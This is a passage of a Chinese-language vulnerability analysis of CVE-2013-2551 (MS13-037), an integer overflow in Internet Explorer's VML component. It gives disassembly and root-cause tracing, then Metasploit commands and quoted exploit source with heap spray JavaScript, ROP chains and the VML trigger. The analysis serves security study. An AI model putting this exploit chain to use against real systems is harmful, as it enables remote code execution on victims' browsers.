88 63 FE FF                call    ??1COAError@@QAE@XZ             ; COAError::~COAError(void).text:1993D9AD.text:1993D9B2 8B C6                         mov     eax, esi.text:1993D9B4 5E                            pop     esi.text:1993D9B5 C9                            leave.text:1993D9B6 C2 0C 00                      retn    0Ch.text:1993D9B6.text:1993D9B9                               ; ---------------------------------------------------------------------------.text:1993D9B9.text:1993D9B9                               loc_1993D9B9:                           ; CODE XREF: COALineDashStyleArray::get_item(int,long *)+22↑j.text:1993D9B9 8B 46 04                      mov     eax, [esi+4].text:1993D9BC 83 65 08 00                   and     [ebp+this], 0.text:1993D9C0 8D 48 10                      lea     ecx, [eax+10h]                  ; this.text:1993D9C3 E8 AD CB FE FF                call    ?IGetObj@CSafeRef@@QBEPAVCObjectSafe@@XZ ; CSafeRef::IGetObj(void).text:1993D9C3.text:1993D9C8 8B C8                         mov     ecx, eax.text:1993D9CA 83 C0 C8                      add     eax, 0FFFFFFC8h.text:1993D9CD F7 D9                         neg     ecx.text:1993D9CF 1B C9                         sbb     ecx, ecx.text:1993D9D1 23 C8                         and     ecx, eax.text:1993D9D3 8D 55 08                      lea     edx, [ebp+this].text:1993D9D6 83 C1 30                      add     ecx, 30h ; &#x27;0&#x27;.text:1993D9D9 8B 01                         mov     eax, [ecx].text:1993D9DB 52                            push    edx.text:1993D9DC 68 CF 01 00 00                push    1CFh.text:1993D9E1 FF 10                         call    dword ptr [eax].text:1993D9E1.text:1993D9E3 8B 45 08                      mov     eax, [ebp+this].text:1993D9E6 85 C0                         test    eax, eax.text:1993D9E8 74 38                         jz      short loc_1993DA22.text:1993D9E8.text:1993D9EA 83 7D 0C FF                   cmp     [ebp+arg_4], 0FFFFFFFFh.text:1993D9EE 7E 29                         jle     short loc_1993DA19.text:1993D9EE.text:1993D9F0 8B 08                         mov     ecx, [eax].text:1993D9F2 50                            push    eax.text:1993D9F3 FF 51 2C                      call    dword ptr [ecx+2Ch].text:1993D9F3.text:1993D9F6 39 45 0C                      cmp     [ebp+arg_4], eax.text:1993D9F9 7D 1E                         jge     short loc_1993DA19.text:1993D9F9.text:1993D9FB FF 75 0C                      push    [ebp+arg_4].text:1993D9FE 8B 45 08                      mov     eax, [ebp+this].text:1993DA01 83 65 FC 00                   and     [ebp+var_4], 0.text:1993DA05 8B 08                         mov     ecx, [eax].text:1993DA07 8D 55 FC                      lea     edx, [ebp+var_4].text:1993DA0A 52                            push    edx.text:1993DA0B 50                            push    eax.text:1993DA0C FF 51 1C                      call    dword ptr [ecx+1Ch].text:1993DA0C.text:1993DA0F 8B 45 10                      mov     eax, [ebp+arg_8].text:1993DA12 8B 4D FC                      mov     ecx, [ebp+var_4].text:1993DA15 89 08                         mov     [eax], ecx.text:1993DA17 EB 8E                         jmp     short loc_1993D9A7.text:1993DA17.text:1993DA19                               ; ---------------------------------------------------------------------------.text:1993DA19.text:1993DA19                               loc_1993DA19:                           ; CODE XREF: COALineDashStyleArray::get_item(int,long *)+6B↑j.text:1993DA19                                                                       ; COALineDashStyleArray::get_item(int,long *)+76↑j.text:1993DA19 C7 45 EC 30 82 04 80          mov     [ebp+var_14], 80048230h.text:1993DA20 EB 85                         jmp     short loc_1993D9A7.text:1993DA20.text:1993DA22                               ; ---------------------------------------------------------------------------.text:1993DA22.text:1993DA22                               loc_1993DA22:                           ; CODE XREF: COALineDashStyleArray::get_item(int,long *)+65↑j.text:1993DA22 C7 45 EC 05 40 00 80          mov     [ebp+var_14], 80004005h.text:1993DA29 E9 79 FF FF FF                jmp     loc_1993D9A7.text:1993DA29.text:1993DA29                               ?get_item@COALineDashStyleArray@@UAGJHPAJ@Z endp.text:1993DA29.text:1993DA29                               ; ---------------------------------------------------------------------------\n\n其反编译代码为\nint __stdcall COALineDashStyleArray::get_item(struct COAProg **this, int a2, int *a3)&#123;  struct COAProg **v3; // esi  int v4; // esi  struct COAProg *v6; // eax  struct CObjectSafe *v7; // eax  void (__thiscall ***v8)(_DWORD, int, struct COAProg ***); // ecx  int v9; // eax  int v10[4]; // [esp+4h] [ebp-14h] BYREF  int v11; // [esp+14h] [ebp-4h] BYREF  v3 = this;  COAError::COAError(    (COAError *)v10,    (struct OADISPSTATIC *)&amp;COADispatchImpl&lt;IVgDashStyleArray,&amp;_GUID const IID_IVgDashStyleArray,COAShapeProg&gt;::s_dispStatic,    this[1],    0);  if ( v10[0] &gt;= 0 )  &#123;    v6 = v3[1];    this = 0;    v7 = CSafeRef::IGetObj((struct COAProg *)((char *)v6 + 16));    v8 = (void (__thiscall ***)(_DWORD, int, struct COAProg ***))(v7 != 0 ? (unsigned int)v7 - 56 + 48 : 48);    (**v8)(v8, 463, &amp;this);    if ( this )    &#123;      if ( a2 &lt;= -1 || (v9 = (*((int (__stdcall **)(struct COAProg **))*this + 11))(this), a2 &gt;= v9) ) //* ORG::CElements(void)      &#123;        v10[0] = -2147188176;      &#125;      else      &#123;        v11 = 0;        (*((void (__stdcall **)(struct COAProg **, int *, int))*this + 7))(this, &amp;v11, a2); //* ORG::Get(void *,int)        *a3 = v11;      &#125;    &#125;    else    &#123;      v10[0] = -2147467259;    &#125;  &#125;  v4 = v10[0];  COAError::~COAError((COAError *)v10);  return v4;&#125;\n\n发现污点依旧来自于 COALineDashStyleArray::get_item 的主调函数,且其主调函数已经不在 VGX.dll 内。因此可以推断,COALineDashStyleArray::get_item 只是触发了异常,而并非造成异常的函数。在《漏洞战争》一书中,这似乎是第一次从 Crash Point 处开始追踪溯源难以分析出漏洞成因的例子。为找出漏洞函数,接下来的分析需要转向从 POC 开始分析样本是如何触发漏洞的,其中有两个关键点\n\nPOC 中的 crashme 函数会获取大量 shape 元素的 _vgRuntimeStyle 属性并通过它获取 rotation 属性,同时注释还提到了 COARuntimeStyle 类\nPOC 为 vml1 元素和 shape 元素的 dashstyle.array.length 属性赋值了 -1\n\n借助这些信息,我们可以锁定 VGX.dll 中的 COARuntimeStyle 类和 COALineDashStyleArray 类为可疑目标,并定位到与赋值操作有关的 COALineDashStyleArray::put_length 函数,其反汇编代码为\n.text:1993DAD5                               ; =============== S U B R O U T I N E =======================================.text:1993DAD5.text:1993DAD5                               ; Attributes: bp-based frame.text:1993DAD5.text:1993DAD5                               ; int __stdcall COALineDashStyleArray::put_length(COALineDashStyleArray *__hidden this, int).text:1993DAD5                               ?put_length@COALineDashStyleArray@@UAGJH@Z proc near.text:1993DAD5                                                                       ; DATA XREF: .text:19944994↓o.text:1993DAD5.text:1993DAD5                               var_10= dword ptr -10h.text:1993DAD5                               this= dword ptr  8.text:1993DAD5                               arg_4= dword ptr  0Ch.text:1993DAD5.text:1993DAD5 8B FF                         mov     edi, edi.text:1993DAD7 55                            push    ebp.text:1993DAD8 8B EC                         mov     ebp, esp.text:1993DADA 83 EC 10                      sub     esp, 10h.text:1993DADD 56                            push    esi.text:1993DADE 8B 75 08                      mov     esi, [ebp+this].text:1993DAE1 6A 01                         push    1                               ; bool.text:1993DAE3 FF 76 04                      push    dword ptr [esi+4]               ; struct COAProg *.text:1993DAE6 8D 4D F0                      lea     ecx, [ebp+var_10]               ; this.text:1993DAE9 68 3C 22 96 19                push    offset ?s_dispStatic@?$COADispatchImpl@UIVgDashStyleArray@@$1?IID_IVgDashStyleArray@@3U_GUID@@BVCOAShapeProg@@@@1UOADISPSTATIC@@A ; struct OADISPSTATIC *.text:1993DAEE E8 53 4D FE FF                call    ??0COAError@@QAE@AAUOADISPSTATIC@@AAVCOAProg@@_N@Z ; COAError::COAError(OADISPSTATIC &amp;,COAProg &amp;,bool).text:1993DAEE.text:1993DAF3 83 7D F0 00                   cmp     [ebp+var_10], 0.text:1993DAF7 7D 12                         jge     short loc_1993DB0B.text:1993DAF7.text:1993DAF9.text:1993DAF9                               loc_1993DAF9:                           ; CODE XREF: COALineDashStyleArray::put_length(int)+E1↓j.text:1993DAF9 8B 75 F0                      mov     esi, [ebp+var_10].text:1993DAFC 8D 4D F0                      lea     ecx, [ebp+var_10]               ; this.text:1993DAFF E8 36 62 FE FF                call    ??1COAError@@QAE@XZ             ; COAError::~COAError(void).text:1993DAFF.text:1993DB04 8B C6                         mov     eax, esi.text:1993DB06 5E                            pop     esi.text:1993DB07 C9                            leave.text:1993DB08 C2 08 00                      retn    8.text:1993DB08.text:1993DB0B                               ; ---------------------------------------------------------------------------.text:1993DB0B.text:1993DB0B                               loc_1993DB0B:                           ; CODE XREF: COALineDashStyleArray::put_length(int)+22↑j.text:1993DB0B 8B 46 04                      mov     eax, [esi+4].text:1993DB0E 83 65 08 00                   and     [ebp+this], 0.text:1993DB12 57                            push    edi.text:1993DB13 8D 48 10                      lea     ecx, [eax+10h]                  ; this.text:1993DB16 E8 5A CA FE FF                call    ?IGetObj@CSafeRef@@QBEPAVCObjectSafe@@XZ ; CSafeRef::IGetObj(void).text:1993DB16.text:1993DB1B 8B C8                         mov     ecx, eax.text:1993DB1D 83 C0 C8                      add     eax, 0FFFFFFC8h.text:1993DB20 F7 D9                         neg     ecx.text:1993DB22 1B C9                         sbb     ecx, ecx.text:1993DB24 23 C8                         and     ecx, eax.text:1993DB26 8D 55 08                      lea     edx, [ebp+this].text:1993DB29 83 C1 30                      add     ecx, 30h ; &#x27;0&#x27;.text:1993DB2C 8B 01                         mov     eax, [ecx].text:1993DB2E 52                            push    edx.text:1993DB2F 68 CF 01 00 00                push    1CFh.text:1993DB34 FF 10                         call    dword ptr [eax].text:1993DB34.text:1993DB36 8B 45 08                      mov     eax, [ebp+this].text:1993DB39 85 C0                         test    eax, eax.text:1993DB3B 74 71                         jz      short loc_1993DBAE.text:1993DB3B.text:1993DB3D 8B 08                         mov     ecx, [eax].text:1993DB3F 50                            push    eax.text:1993DB40 FF 51 2C                      call    dword ptr [ecx+2Ch].text:1993DB40.text:1993DB43 8B 75 0C                      mov     esi, [ebp+arg_4].text:1993DB46 3B C6                         cmp     eax, esi.text:1993DB48 7D 55                         jge     short loc_1993DB9F.text:1993DB48.text:1993DB4A 68 01 01 00 00                push    101h                            ; int.text:1993DB4F 2B F0                         sub     esi, eax.text:1993DB51 33 C9                         xor     ecx, ecx.text:1993DB53 6A 04                         push    4.text:1993DB55 5A                            pop     edx.text:1993DB56 8B C6                         mov     eax, esi.text:1993DB58 F7 E2                         mul     edx.text:1993DB5A 0F 90 C1                      seto    cl.text:1993DB5D F7 D9                         neg     ecx.text:1993DB5F 0B C8                         or      ecx, eax.text:1993DB61 51                            push    ecx                             ; Size.text:1993DB62 E8 16 5E F8 FF                call    ??2@YAPAXIH@Z                   ; operator new(uint,int).text:1993DB62.text:1993DB67 8B F8                         mov     edi, eax.text:1993DB69 59                            pop     ecx.text:1993DB6A 59                            pop     ecx.text:1993DB6B 85 FF                         test    edi, edi.text:1993DB6D 74 3F                         jz      short loc_1993DBAE.text:1993DB6D.text:1993DB6F 8B C6                         mov     eax, esi.text:1993DB71 C1 E0 02                      shl     eax, 2.text:1993DB74 50                            push    eax                             ; Size.text:1993DB75 6A 00                         push    0                               ; Val.text:1993DB77 57                            push    edi                             ; void *.text:1993DB78 E8 77 99 FA FF                call    _memset.text:1993DB78.text:1993DB7D 8B 45 08                      mov     eax, [ebp+this].text:1993DB80 8B 08                         mov     ecx, [eax].text:1993DB82 83 C4 0C                      add     esp, 0Ch.text:1993DB85 56                            push    esi.text:1993DB86 57                            push    edi.text:1993DB87 50                            push    eax.text:1993DB88 FF 51 18                      call    dword ptr [ecx+18h].text:1993DB88.text:1993DB8B 85 C0                         test    eax, eax.text:1993DB8D 75 07                         jnz     short loc_1993DB96.text:1993DB8D.text:1993DB8F C7 45 F0 05 40 00 80          mov     [ebp+var_10], 80004005h.text:1993DB8F.text:1993DB96.text:1993DB96                               loc_1993DB96:                           ; CODE XREF: COALineDashStyleArray::put_length(int)+B8↑j.text:1993DB96 57                            push    edi                             ; void *.text:1993DB97 E8 2D 79 FA FF                call    ??3@YAXPAX@Z                    ; operator delete(void *).text:1993DB97.text:1993DB9C 59                            pop     ecx.text:1993DB9D EB 16                         jmp     short loc_1993DBB5.text:1993DB9D.text:1993DB9F                               ; ---------------------------------------------------------------------------.text:1993DB9F.text:1993DB9F                               loc_1993DB9F:                           ; CODE XREF: COALineDashStyleArray::put_length(int)+73↑j.text:1993DB9F 8B 4D 08                      mov     ecx, [ebp+this].text:1993DBA2 8B 11                         mov     edx, [ecx].text:1993DBA4 2B C6                         sub     eax, esi.text:1993DBA6 50                            push    eax.text:1993DBA7 56                            push    esi.text:1993DBA8 51                            push    ecx.text:1993DBA9 FF 52 28                      call    dword ptr [edx+28h].text:1993DBA9.text:1993DBAC EB 07                         jmp     short loc_1993DBB5.text:1993DBAC.text:1993DBAE                               ; ---------------------------------------------------------------------------.text:1993DBAE.text:1993DBAE                               loc_1993DBAE:                           ; CODE XREF: COALineDashStyleArray::put_length(int)+66↑j.text:1993DBAE                                                                       ; COALineDashStyleArray::put_length(int)+98↑j.text:1993DBAE C7 45 F0 05 40 00 80          mov     [ebp+var_10], 80004005h.text:1993DBAE.text:1993DBB5.text:1993DBB5                               loc_1993DBB5:                           ; CODE XREF: COALineDashStyleArray::put_length(int)+C8↑j.text:1993DBB5                                                                       ; COALineDashStyleArray::put_length(int)+D7↑j.text:1993DBB5 5F                            pop     edi.text:1993DBB6 E9 3E FF FF FF                jmp     loc_1993DAF9.text:1993DBB6.text:1993DBB6                               ?put_length@COALineDashStyleArray@@UAGJH@Z endp.text:1993DBB6.text:1993DBB6                               ; ---------------------------------------------------------------------------\n\n其反编译代码为\nint __stdcall COALineDashStyleArray::put_length(struct COAProg **this, int a2)&#123;  struct COAProg **v2; // esi  int v3; // esi  struct COAProg *v5; // eax  struct CObjectSafe *v6; // eax  void (__thiscall ***v7)(_DWORD, int, struct COAProg ***); // ecx  int v8; // eax  int v9; // esi  void *v10; // edi  int v11[4]; // [esp+4h] [ebp-10h] BYREF  v2 = this;  COAError::COAError(    (COAError *)v11,    (struct OADISPSTATIC *)&amp;COADispatchImpl&lt;IVgDashStyleArray,&amp;_GUID const IID_IVgDashStyleArray,COAShapeProg&gt;::s_dispStatic,    this[1],    1);  if ( v11[0] &gt;= 0 )  &#123;    v5 = v2[1];    this = 0;    v6 = CSafeRef::IGetObj((struct COAProg *)((char *)v5 + 16));    v7 = (void (__thiscall ***)(_DWORD, int, struct COAProg ***))(v6 != 0 ? (unsigned int)v6 - 56 + 48 : 48);    (**v7)(v7, 463, &amp;this);    if ( !this )      goto LABEL_10;    v8 = (*((int (__stdcall **)(struct COAProg **))*this + 11))(this); //* ORG::CElements(void)    if ( v8 &gt;= a2 )    &#123;      (*((void (__stdcall **)(struct COAProg **, int, int))*this + 10))(this, a2, v8 - a2); //* ORG::DeleteRange(int,int)      goto LABEL_2;    &#125;    v9 = a2 - v8;    v10 = operator new((unsigned __int64)(unsigned int)(a2 - v8) &gt;&gt; 30 != 0 ? -1 : 4 * (a2 - v8), 257);    if ( !v10 )    &#123;LABEL_10:      v11[0] = -2147467259;      goto LABEL_2;    &#125;    memset(v10, 0, 4 * v9);    if ( !(*((int (__stdcall **)(struct COAProg **, void *, int))*this + 6))(this, v10, v9) ) //* ORG::FAppendRange(void const *,int)      v11[0] = -2147467259;    operator delete(v10);  &#125;LABEL_2:  v3 = v11[0];  COAError::~COAError((COAError *)v11);  return v3;&#125;\n\n查看 ORG 类虚表后能够知道该函数进行了哪些函数调用(已注释在对应位置),通过这些函数调用与函数名猜测 COALineDashStyleArray::put_length 函数会先获取对象数组的当前长度,并根据需要目标长度决定扩大还是缩小容量。在函数入口下断点进行动态分析,注意到参数 a2 为 -1,这意味者 a2 应该就是需要修改的目标长度。跟进,发现 COALineDashStyleArray::put_length 函数调用了 ORG::CElements 函数并将其返回值赋给了变量 v8,ORG::CElements 函数的反编译代码为\nint __stdcall ORG::CElements(ORG *this)&#123;  return *((unsigned __int16 *)this + 2);&#125;\n\n结合函数上下文推断 v8,或者说对象指针偏移 4 字节处的指针指向的数据即为对象数组的当前长度。由于目标长度为负数而当前长度显然会是一个非负数,程序应该会进入到缩小容量的执行路径。逐步跟进,发现 COALineDashStyleArray::put_length 函数确实调用了 ORG::DeleteRange 函数,步入的同时在 IDA 中定位 ORG::DeleteRange 函数,其反编译代码为\nvoid __stdcall ORG::DeleteRange(ORG *this, int a2, int a3)&#123;  MsoDeletePx((char *)this + 4, a2, a3);&#125;\n\n发现 MsoDeletePx 函数的第一个参数实际上就是对象数组的当前长度,接着步入 MsoDeletePx 函数,其反编译代码为\nint __stdcall MsoDeletePx(_WORD *a1, int a2, int a3)&#123;  MsoFRemovePx(a1, a2, a3);  return MsoFCompactPx(a1, *a1 == 0);&#125;\n\n步入 MsoFRemovePx 函数,其反编译代码为\nint __stdcall MsoFRemovePx(_DWORD *a1, int a2, int a3)&#123;  unsigned int v4; // edi  char *v5; // ecx  _DWORD *v6; // edi  int v8; // edx  char *v10; // [esp+14h] [ebp+8h]  int v11; // [esp+18h] [ebp+Ch]  v4 = (unsigned __int16)a1[1];  v5 = (char *)(a1[3] + a2 * v4);  if ( (int)a1[1] &lt; 0 ) //* 不进入  &#123;    v11 = 0;    v10 = v5;    v6 = v5;    while ( a3 )    &#123;      if ( (*v6)-- == 1 )      &#123;        ++v11;      &#125;      else      &#123;        memcpy(v10, v6, *((unsigned __int16 *)a1 + 2));        v10 += (unsigned __int16)a1[1];      &#125;      --a3;      v6 = (_DWORD *)((char *)v6 + (unsigned __int16)a1[1]);    &#125;    a3 = v11;    v4 = (unsigned __int16)a1[1];    v5 = v10;    a2 = (unsigned int)&amp;v10[-a1[3]] / v4;  &#125;  v8 = *(unsigned __int16 *)a1;  if ( a3 + a2 != v8 &amp;&amp; a3 &gt; 0 ) //* 不进入    memmove(v5, &amp;v5[a3 * v4], v4 * (v8 - a2 - a3));  *(_WORD *)a1 -= a3; //！ Vulnerable Point  return a3;&#125;\n\n注意到\nORG::DeleteRange(this, a2, v8 - a2); //* this 为对象指针, a2 为目标长度, v8 - a2 为当前长度与目标长度的差MsoDeletePx((char *)this + 4, a2, a3); //* this + 4 为当前长度, a2 为目标长度, a3 为当前长度与目标长度的差MsoFRemovePx(a1, a2, a3); //* a1 为当前长度, a2 为目标长度, a3 为当前长度与目标长度的差*(_WORD *)a1 -= a3; //！ a1 = a1 - (a1 - a2) = 当前长度 - (当前长度 - 目标长度) = a2 = 目标长度 = 0xFFFF (-1 类型转换为了 _WORD 类型)\n\n整数溢出发生。此时对象 array 属性的 length 字段大于该数组的实际长度，故在通过数组下标读写 array 属性，即执行 vgx!COALineDashStyleArray::get_item 函数时可实现越界读，执行 vgx!COALineDashStyleArray::put_item 函数时可实现越界写，并在进一步地漏洞利用中实现 RCE\n漏洞利用使用 MSF 搜索该漏洞的 exp\nmsfconsolemsf6 &gt; search cve-2013-2551\n\n搜索结果\nMatching Modules================   #  Name                                            Disclosure Date  Rank    Check  Description   -  ----                                            ---------------  ----    -----  -----------   0  exploit/windows/browser/ms13_037_svg_dashstyle  2013-03-06       normal  No     MS13-037 Microsoft Internet Explorer COALineDashStyleArray Integer OverflowInteract with a module by name or index. For example info 0, use 0 or use exploit/windows/browser/ms13_037_svg_dashstyle\n\n调用该模块并查看模块详情\nmsf6 &gt; use exploit/windows/browser/ms13_037_svg_dashstylemsf6 exploit(windows/browser/ms13_037_svg_dashstyle) &gt; info\n\n模块详情信息\n       Name: MS13-037 Microsoft Internet Explorer COALineDashStyleArray Integer Overflow     Module: exploit/windows/browser/ms13_037_svg_dashstyle   Platform: Windows       Arch: x86 Privileged: No    License: Metasploit Framework License (BSD)       Rank: Normal  Disclosed: 2013-03-06Provided by:  Nicolas Joly  4B5F5F4B  juan vazquez &lt;juan.vazquez@metasploit.com&gt;  sinn3r &lt;sinn3r@metasploit.com&gt;Available targets:      Id  Name      --  ----  =&gt;  0   IE 8 on Windows 7 SP1Check supported:  NoBasic options:  Name       Current Setting  Required  Description  ----       ---------------  --------  -----------  OBFUSCATE  false            no        Enable JavaScript obfuscation  Retries    true             no        Allow the browser to retry the module  SRVHOST    *******          yes       The local host or network interface to listen on. This must be an address on the lo                                        cal machine or ******* to listen on all addresses.  SRVPORT    8080             yes       The local port to listen on.  SSL        false            no        Negotiate SSL for incoming connections  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)  URIPATH                     no        The URI to use for this exploit (default is random)Payload information:  Space: 948Description:  This module exploits an integer overflow vulnerability on Internet Explorer.  The vulnerability exists in the handling of the dashstyle.array length for vml  shapes on the vgx.dll module.    The exploit has been built and tested specifically against Windows 7 SP1 with  Internet Explorer 8. It uses either JRE6 or an information leak (to ntdll) to  bypass ASLR, and by default the info leak is used. To make sure the leak is  successful, the ntdll version should be either v6.1.7601.17514 (the default dll  version on a newly installed/unpatched Windows 7 SP1), or ntdll.dll v6.1.7601.17725  (installed after apply MS12-001). If the target doesn&#x27;t have the version the exploit  wants, it will refuse to attack by sending a fake 404 message (webpage not found).    If you wish to try the JRE6 component instead to bypass ASLR, you can set the  advanced datastore option to &#x27;JRE6&#x27;. If JRE6 is chosen but the target doesn&#x27;t  have this particular component, the exploit will also refuse to attack by  sending a 404 message.References:  https://nvd.nist.gov/vuln/detail/CVE-2013-2551  OSVDB (91197)  http://www.securityfocus.com/bid/58570  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2013/MS13-037  http://binvul.com/viewthread.php?tid=311View the full module info with the info -d command.\n\n使用该模块生成木马\nmsf6 exploit(windows/browser/ms13_037_svg_dashstyle) &gt; set payload windows/execmsf6 exploit(windows/browser/ms13_037_svg_dashstyle) &gt; set CMD calc.exemsf6 exploit(windows/browser/ms13_037_svg_dashstyle) &gt; exploit\n\n随后 MSF 将在本地启动 Web Server 并在攻击目标访问时为其响应异常 HTML 页面以触发漏洞\nExploit 分析该模块的 exp 位于\n/usr/share/metasploit-framework/modules/exploits/windows/browser/ms13_037_svg_dashstyle.rb\n\nexp 的核心代码为\n### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::Remote::BrowserExploitServer  include Msf::Exploit::RopDb  def initialize(info=&#123;&#125;)    super(update_info(info,      &#x27;Name&#x27;           =&gt; &quot;MS13-037 Microsoft Internet Explorer COALineDashStyleArray Integer Overflow&quot;,      &#x27;Description&#x27;    =&gt; %q&#123;...&#125;,      &#x27;License&#x27;        =&gt; MSF_LICENSE,      &#x27;Author&#x27;         =&gt; [...],      &#x27;References&#x27;     =&gt; [...],      &#x27;Payload&#x27;        =&gt; &#123;...&#125;,      &#x27;DefaultOptions&#x27;  =&gt; &#123;...&#125;,      &#x27;Platform&#x27;       =&gt; &#x27;win&#x27;,      &#x27;Arch&#x27;           =&gt; ARCH_X86,      &#x27;BrowserRequirements&#x27; =&gt; &#123;...&#125;,      &#x27;Targets&#x27;        =&gt; [...],      &#x27;Privileged&#x27;     =&gt; false,      &#x27;DisclosureDate&#x27; =&gt; &#x27;2013-03-06&#x27;,      &#x27;DefaultTarget&#x27;  =&gt; 0))    register_options(...)    register_advanced_options(...)  end  def exploit    @second_stage_url = &quot;#&#123;get_module_resource&#125;#&#123;rand_text_alpha(10)&#125;&quot;.chomp    @leak_param = rand_text_alpha(5)    super  end  #* 堆喷布局  def ie_heap_spray(my_target, p)    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))    js_nops = Rex::Text.to_unescape(&quot;\\x0c&quot;*4, Rex::Arch.endian(target.arch))    randnop = rand_text_alpha(rand(100) + 1)    # Land the payload at 0x0c0c0c0c    # For IE 8    js = %Q|var heap_obj = new heapLib.ie(0x20000);var code = unescape(&quot;#&#123;js_code&#125;&quot;);var #&#123;randnop&#125; = &quot;#&#123;js_nops&#125;&quot;;var nops = unescape(#&#123;randnop&#125;);while (nops.length &lt; 0x80000) nops += nops;var offset = nops.substring(0, #&#123;my_target[&#x27;Offset&#x27;]&#125;);var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);while (shellcode.length &lt; 0x40000) shellcode += shellcode;var block = shellcode.substring(0, (0x80000-6)/2);heap_obj.gc();for (var i=1; i &lt; 0x300; i++) &#123;  heap_obj.alloc(block);&#125;    |    js = heaplib(js, &#123;:noobfu =&gt; true&#125;)    if datastore[&#x27;OBFUSCATE&#x27;]      js = ::Rex::Exploitation::JSObfu.new(js)      js.obfuscate(memory_sensitive: true)    end    return js  end  #* ROP 链  def get_ntdll_rop    case @ntdll_version    when &quot;6.1.7601.17514&quot;      stack_pivot = [        @ntdll_base+0x0001578a, # ret # from ntdll        @ntdll_base+0x000096c9, # pop ebx # ret # from ntdll        @ntdll_base+0x00015789, # xchg eax, esp # ret from ntdll      ].pack(&quot;V*&quot;)      ntdll_rop = [        @ntdll_base+0x45F18, # ntdll!ZwProtectVirtualMemory        0x0c0c0c40, # ret to shellcode        0xffffffff, # ProcessHandle        0x0c0c0c34, # ptr to BaseAddress        0x0c0c0c38, # ptr to NumberOfBytesToProtect        0x00000040, # NewAccessProtection        0x0c0c0c3c, # ptr to OldAccessProtection        0x0c0c0c40, # BaseAddress        0x00000400, # NumberOfBytesToProtect        0x41414141  # OldAccessProtection      ].pack(&quot;V*&quot;)      return stack_pivot + ntdll_rop    when &quot;6.1.7601.17725&quot;      stack_pivot = [        @ntdll_base+0x0001579a, # ret # from ntdll        @ntdll_base+0x000096c9, # pop ebx # ret # from ntdll        @ntdll_base+0x00015799, # xchg eax, esp # ret from ntdll      ].pack(&quot;V*&quot;)      ntdll_rop = [        @ntdll_base+0x45F18, # ntdll!ZwProtectVirtualMemory        0x0c0c0c40, # ret to shellcode        0xffffffff, # ProcessHandle        0x0c0c0c34, # ptr to BaseAddress        0x0c0c0c38, # ptr to NumberOfBytesToProtect        0x00000040, # NewAccessProtection        0x0c0c0c3c, # ptr to OldAccessProtection        0x0c0c0c40, # BaseAddress        0x00000400, # NumberOfBytesToProtect        0x41414141  # OldAccessProtection      ].pack(&quot;V*&quot;)      return stack_pivot + ntdll_rop    else      return &quot;&quot;    end  end  #* 封装 payload  def get_payload(t, cli)    code = payload.encoded    # No rop. Just return the payload.    return code if t.opts[&#x27;Rop&#x27;].nil?    # Both ROP chains generated by mona.py - See corelan.be    case t.opts[&#x27;Rop&#x27;]    when :jre      print_status(&quot;Using JRE ROP&quot;)      stack_pivot = [        0x7c348b06, # ret # from msvcr71        0x7c341748, # pop ebx # ret # from msvcr71        0x7c348b05  # xchg eax, esp # ret from msvcr71      ].pack(&quot;V*&quot;)      rop_payload = generate_rop_payload(&#x27;java&#x27;, code, &#123;&#x27;pivot&#x27;=&gt;stack_pivot&#125;)    when :ntdll      print_status(&quot;Using ntdll ROP&quot;)      rop_payload = get_ntdll_rop + payload.encoded    end    return rop_payload  end  #* 漏洞利用 payload  def load_exploit_html(my_target, cli)    p  = get_payload(my_target, cli)    js = ie_heap_spray(my_target, p)    js_trigger = %Q|var rect_array = new Array()var a = new Array()function createRects()&#123;  for(var i=0; i&lt;0x1000; i++)&#123;    rect_array[i]    = document.createElement(&quot;v:shape&quot;)    rect_array[i].id = &quot;rect&quot; + i.toString()    document.body.appendChild(rect_array[i])  &#125;&#125;function exploit()&#123;  var vml1 = document.getElementById(&quot;vml1&quot;)  for (var i=0; i&lt;0x1000; i++)&#123;    a[i] = document.getElementById(&quot;rect&quot; + i.toString())._anchorRect;    if (i == 0x800) &#123;      vml1.dashstyle = &quot;1 2 3 4&quot;    &#125;  &#125;  vml1.dashstyle.array.length = 0 - 1;  vml1.dashstyle.array.item(6) = 0x0c0c0c0c;  for (var i=0; i&lt;0x1000; i++)  &#123;    delete a[i];    CollectGarbage();  &#125;  location.reload();&#125;    |    create_rects_func = &quot;createRects&quot;    exploit_func = &quot;exploit&quot;    if datastore[&#x27;OBFUSCATE&#x27;]      js_trigger = ::Rex::Exploitation::JSObfu.new(js_trigger)      js_trigger.obfuscate(memory_sensitive: true)      create_rects_func = js_trigger.sym(&quot;createRects&quot;)      exploit_func = js_trigger.sym(&quot;exploit&quot;)    end    html = %Q|&lt;html&gt;&lt;head&gt;&lt;script&gt;#&#123;js&#125;&lt;/script&gt;&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=EmulateIE9&quot; &gt;&lt;/head&gt;&lt;title&gt;&lt;/title&gt;&lt;style&gt;v\\\\: * &#123; behavior:url(#default#VML); display:inline-block &#125;&lt;/style&gt;&lt;xml:namespace ns=&quot;urn:schemas-microsoft-com:vml&quot; prefix=&quot;v&quot; /&gt;&lt;script&gt;#&#123;js_trigger&#125;&lt;/script&gt;&lt;body onload=&quot;#&#123;create_rects_func&#125;(); #&#123;exploit_func&#125;();&quot;&gt;&lt;v:oval&gt;&lt;v:stroke id=&quot;vml1&quot;/&gt;&lt;/v:oval&gt;&lt;/body&gt;&lt;/html&gt;    |    return html  end  #* 信息泄露 payload  def html_info_leak    uri_prefix = &quot;#&#123;get_resource.chomp(&quot;/&quot;)&#125;/#&#123;@second_stage_url&#125;&quot;.gsub(&#x27;//&#x27;, &#x27;/&#x27;)    js_trigger = %Q|var rect_array = new Array()var a = new Array()function createRects()&#123;  for(var i=0; i&lt;0x400; i++)&#123;    rect_array[i]    = document.createElement(&quot;v:shape&quot;)    rect_array[i].id = &quot;rect&quot; + i.toString()    document.body.appendChild(rect_array[i])  &#125;&#125;function exploit()&#123;  var vml1  = document.getElementById(&quot;vml1&quot;)  for (var i=0; i&lt;0x400; i++)&#123;    a[i] = document.getElementById(&quot;rect&quot; + i.toString())._vgRuntimeStyle;  &#125;  for (var i=0; i&lt;0x400; i++)&#123;    a[i].rotation;    if (i == 0x300) &#123;      vml1.dashstyle = &quot;1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 